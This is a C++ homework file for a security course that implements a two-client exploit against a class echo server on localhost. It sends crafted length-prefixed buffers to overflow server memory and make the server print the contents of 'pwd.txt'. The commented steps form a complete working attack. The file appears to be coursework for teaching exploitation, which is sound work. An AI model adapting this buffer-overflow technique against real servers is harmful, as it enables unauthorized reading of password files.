// HW 6 - Echo server exploit
// THIS is the file that you need to modify this file for this assignment

#include <iostream>
#include <string>
#include "TCPComm.h"

using namespace std;
using namespace CS422;

void GotData(TCPComm* comm, unsigned char* data, int dataLength)
{
	char* buf = new char[dataLength + 1];

	memcpy(buf, data, dataLength);
	buf[dataLength] = 0;

	cout << endl;
	cout << "Got from server: " << buf << endl;
	cout << "Enter a string to send to the server: ";
}

int main(int argc, const char* argv[])
{
	TCPComm* comm = NULL;
	TCPComm* comm2 = NULL;

	//Buffers used to exploit the system
	char hackBuf[2048];
	char hackBuf2[2048];
	memset(hackBuf, 0x33, sizeof(hackBuf)); //2048 non-null bytes
	memset(hackBuf2, 0x33, 1024);
	strcpy(&hackBuf2[1024], "pwd.txt"); //"pwd.txt" is at the very beginning of second 1024 bytes
	((unsigned short *)hackBuf)[0] = (unsigned short)2048; //Set first 2 bytes to 2048 (size of buf)
	((unsigned short *)hackBuf2)[0] = (unsigned short)2049; //Set first 2 bytes to 2049 (larger than buf)
	

	//Decide which client path to follow (choose client 1 first and then client 2)
	cout << "Enter client number (if first client you are opening enter 1): ";
	string s;
	getline(cin, s);
	int i = atoi(s.c_str());
	
	//Open client 1 first!
	if (i == 1) 
	{
		comm = TCPComm::Create("localhost", 42200); //Step 1: Open Client 1
		comm->OnDataReceived = GotData;
		char* handshake = "422 echo server handshake";
		comm->Send(handshake, strlen(handshake) + 1); //Step 2: Send Client 1 Handshake

		cout << "Hit enter to send hackBuf ";//Step 3: Send Hackbuf from Client 1 (hit enter) -> Sends 2048 non-zero bytes so server's memset will set inUse to 0
		getline(cin, s); 
		comm->Send(hackBuf, 2048); 
		cout << "Now open another client then hit enter to send hackBuf2" << endl; //Step 4: Hang here while you open Client 2
		getline(cin, s);
		comm->Send(hackBuf2, 2048); //Step 7: Send Hackbuf2 from Client 1 -> Overwrites beginning of buffer to say "pwd.txt" then makes server Hang waiting for more bytes
		cout << "Sent pwd, now do handshake with other client" << endl;
		getline(cin, s);
	}

	//Open this client after you have sent hackBuf (just the first one) to server from other client
	else
	{
		comm2 = TCPComm::Create("localhost", 42200); //Step 5: Open Client 2
		comm2->OnDataReceived = GotData;
		char* handshake = "422 echo server handshake";
		cout << "Wait to handshake until you've sent the next buf from other client (hit enter when ready)" << endl; //Step 6: Hang before sending handshake until Client 1 sends Hackbuf2
		getline(cin, s);
		comm2->Send(handshake, strlen(handshake) + 1); //Step 8: Send handshake which will cause server to print out pwd.txt
		getline(cin, s);
	}
	

	cout << "Done" << endl;
}